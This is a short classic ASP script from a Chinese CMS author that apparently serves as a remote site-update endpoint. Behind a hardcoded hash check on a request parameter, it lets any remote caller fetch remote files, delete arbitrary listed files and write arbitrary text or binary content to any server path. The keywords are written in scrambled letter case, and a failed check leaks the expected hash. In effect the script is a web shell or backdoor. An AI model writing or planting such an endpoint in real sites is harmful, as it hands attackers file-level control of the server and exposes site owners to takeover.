<%
'************************************************************
'作者：云端 (精通ASP/VB/PHP/JS/Flash，交流合作可联系本人)
'版权：源代码公开，各种用途均可免费使用。 
'创建：2016-01-20
'联系：QQ313801120  交流群35915100(群里已有几百人)    邮箱313801120@qq.com   个人主页 sharembweb.com
'更多帮助，文档，更新　请加群(35915100)或浏览(sharembweb.com)获得
'*                                    Powered By 云端 
'************************************************************
%>
<!--#iNClUDe fILe="Config.Asp"-->
<%
cALl uPWeB()
sUB uPWeB()
dIM b, c, d, e, f, g, h, i, j, k, l, m
iF rEQuESt("act") = "getVersionNumber" tHEn
cALl dIE("V1.1")
eND iF
iF gETiP = "127.0.0.1" oR iNStR(gETiP, "192.168.") > 0 tHEn
cALl dIE("为本地，不可以上传文件")
eND iF
iF mD5(rEQuESt("UPEV"), 2) & mD5(rEQuESt("UPEV"), 4) <> "6178bbf3bfe62a59" tHEn
cALl dIE("UPEV=" & rEQuESt("UPEV") & "(" & mD5(rEQuESt("UPEV"), 2) & mD5(rEQuESt("UPEV"), 4) & ")")
eND iF
iF rEQuESt("DownFile") <> "" tHEn
cALl dOWnREmOTeFIlE(rEQuESt("DownFile"))
rESpONsE.eND()
eLSeIF rEQuESt("act") = "delWithout" tHEn
c = rF("Content")
f = sPLiT(c, vBCrLF)
fOR eACh b iN f
iF b<>"" tHEn
iF cHEcKFiLE(b)=tRUe tHEn
cALl dELeTEfILe(b)
i=i & b & "(Del True)" & vBCrLF
eLSe
i=i & b & "(Del NoFile)" & vBCrLF
eND iF
eND iF
nEXt
cALl dIE(i)
eND iF
iF rEQuESt("act") = "Comparison" tHEn
c = rF("Content")
f = sPLiT(c, vBCrLF)
fOR eACh e iN f
iF e <> "" tHEn
g = sPLiT(e, "|")
b = g(0)
l = g(1)
iF cHEcKFiLE(b) = tRUe tHEn
k = gETfILeEDiTDaTE(b)
k = fORmAT_TImE(k, 1)
iF dATeDIfF("s", l, k) <= 0 tHEn
i = i & b & vBCrLF
eND iF
eLSe
i = i & b & vBCrLF
eND iF
eND iF
nEXt
cALl rW(i)
rESpONsE.eND()
eND iF
b = rEQuESt.fORm("FilePath")
c = rEQuESt.fORm("Content")
m = rEQuESt.fORm("CharSet")
d = lCAsE(gETfILeEXtNAmE(b))
b = hANdLEpATh(b)
cALl cREaTEdIRfOLdER(b)
iF rEQuESt("UpType") = "binary" tHEn
cALl dECsAVeBInARy(b, c, 2)
cALl rW(b & "|二进制保存")
eLSe
c = sPEcIAlHTmLUpLOaDEnCRyPTiONdECrYPt(c, "Decrypt")
cALl wRItEToFIlE(b, c, m)
cALl rW(b & "|普通保存")
eND iF
eND sUB
%>


